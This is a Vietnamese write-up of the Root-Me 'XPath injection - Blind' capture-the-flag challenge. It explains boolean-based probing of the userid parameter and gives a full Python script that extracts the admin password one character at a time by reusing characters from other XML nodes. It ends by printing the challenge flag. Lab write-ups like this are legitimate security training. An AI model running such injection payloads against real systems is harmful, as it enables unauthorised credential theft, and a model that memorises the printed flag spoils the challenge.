# [XPath injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)

## Solutions

Xuất hiện lỗi XPath ở GET request parameters, nếu gửi request `GET /web-serveur/ch24/?action=user&userid='` sẽ có lỗi:

- `SimpleXMLElement::xpath(): Invalid expression in <b>/challenge/web-serveur/ch24/index.php`
- `XPath error : //user[userid=\']`

Gửi request `GET /web-serveur/ch24/?action=user&userid=2 and conditions`, trong đó:

- `userid=2` là của John, admin
- Có thể thay `conditions` bằng tên element để xem có tồn tại element đó hay không, nếu không có thì sẽ báo lỗi
- Có thể thay `conditions` thành một lệnh so sánh để kiểm tra xem nó là True hay False, nếu False thì sẽ báo lỗi

Attack, thay conditions bằng:

- `password` => có tồn tại element `password` là child của `user`
- `string-length(password)=13` => password của John dài 13 ký tự
- `starts-with(password, 'a')`: Kiểm tra xem ký tự đầu của password có phải là `a` hay không, tuy nhiên các ký tự `'` và `"` đã bị escaped

Không thể dùng ký tự từ phía ngoài truyền vào => Sử dụng những ký tự có sẵn ở phía server, sử dụng xpath để lấy các ký tự ở các node `username`, `email`.

Đây là một đoạn code lấy trên mạng [link](https://github.com/NhatNam-Kyoto/Rootme-Solution/blob/master/Xpath-blind.py)

```python
import requests
import re


url = "http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2"

payload1 = url + "and string-length(password)=%d"

for i in range(10,30):
 r = requests.get(payload1 %i)
 if re.search('John', r.text) is not None:
  p_length = i
  break

print ("password length: " + str(p_length))

charset = {
 "a":"substring(//user[3]/email,5,1)",
 "b":"substring(//user[1]/email,9,1)",
 "c":"substring(//user[3]/email,3,1)",
 "d":"substring(//user[2]/email,6,1)",
 "e":"substring(//user[1]/email,3,1)",
 "g":"substring(//user[2]/email,12,1)",
 "h":"substring(//user[2]/email,3,1)",
 "i":"substring(//user[3]/email,2,1)",
 "J":"substring(//user[2]/email,1,1)",
 "l":"substring(//user[5]/email,2,1)",
 "m":"substring(//user[1]/email,14,1)",
 "n":"substring(//user[2]/email,4,1)",
 "o":"substring(//user[2]/email,2,1)",
 "r":"substring(//user[3]/email,1,1)",
 "s":"substring(//user[1]/email,1,1)",
 "t":"substring(//user[1]/email,2,1)",
 "v":"substring(//user[1]/email,4,1)",
 "y":"substring(//user[4]/email,5,1)",
 "z":"substring(//user[3]/email,11,1)",
 "0":"string(0)",
 "1":"string(1)",
 "2":"string(2)",
 "3":"string(3)",
 "4":"string(4)",
 "5":"string(5)",
 "6":"string(6)",
 "7":"string(7)",
 "8":"string(8)",
 "9":"string(9)",
 "@":"substring(//user[3]/email,4,1)",
 ".":"substring(//user[3]/email,8,1)",
 "u":"substring(//user[4]/account,2,1)",
 "j":"substring(//user[1]/email,7,1)",
 "E":"substring(//user[5]/email,1,1)",
 "S":"substring(//user[1]/username,1,1)"
}
tmp="abcdeghiJlmnorstvyz0123456789@.ujES"
payload2 = url + " and substring(password,%d,1)=%s"
password=""

for i in range(1,p_length+1):
 for index in range(len(charset)):
  r = requests.get(payload2 %(i,charset[tmp[index]]))
  #sprint(payload2 %(i,charset[tmp[index]]))
  if re.search('John', r.text) is not None:
   password+=tmp[index]
   print("password founded: " + password)
   break
print(password)

#length=13
#pass is : **iJ*a*5*1.oS
```

Họ lấy các kí tự có sẵn (bị thiếu: f, x, ...) tuy nhiên Flag bài này chỉ gồm các ký tự đó.

Flag: `ueiJ4a65@1.oS`

Trong trường hợp flag gồm các ký tự bị thiếu kia thì ta cần một nơi có thể lấy được tất cả các ký tự. Để ý thấy có một mục gửi message cho user.

- Thay conditions bằng `count(child::*)=5` => child elements của user là 5:
  - userid
  - username
  - password
  - email
  - element cuối cùng có thể là message mình gửi cho user

`string-length(name(./*[4]))=7` => tên có độ dài 7. Áp dụng tương tự cách tìm Flag ở trên đến tìm ra cấu trúc xml của element cuối (name, child node, ...), có thể sẽ tìm được nơi chứa message người dùng upload lên.

## References

- <https://github.com/NhatNam-Kyoto/Rootme-Solution/blob/master/Xpath-blind.py>
